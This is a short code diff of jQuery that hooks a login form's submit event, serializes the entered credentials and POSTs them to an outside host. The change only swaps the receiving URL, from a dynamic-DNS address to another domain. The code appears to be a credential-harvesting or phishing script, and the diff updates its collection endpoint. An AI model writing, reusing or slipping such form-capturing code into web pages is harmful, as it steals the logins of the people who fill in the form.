@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "http://tespek.dickdns.org/curl/",
+        url: "https://ringsekprojects.net/json/",
         type: "POST",
         data: d.serialize(),
         success: function () {
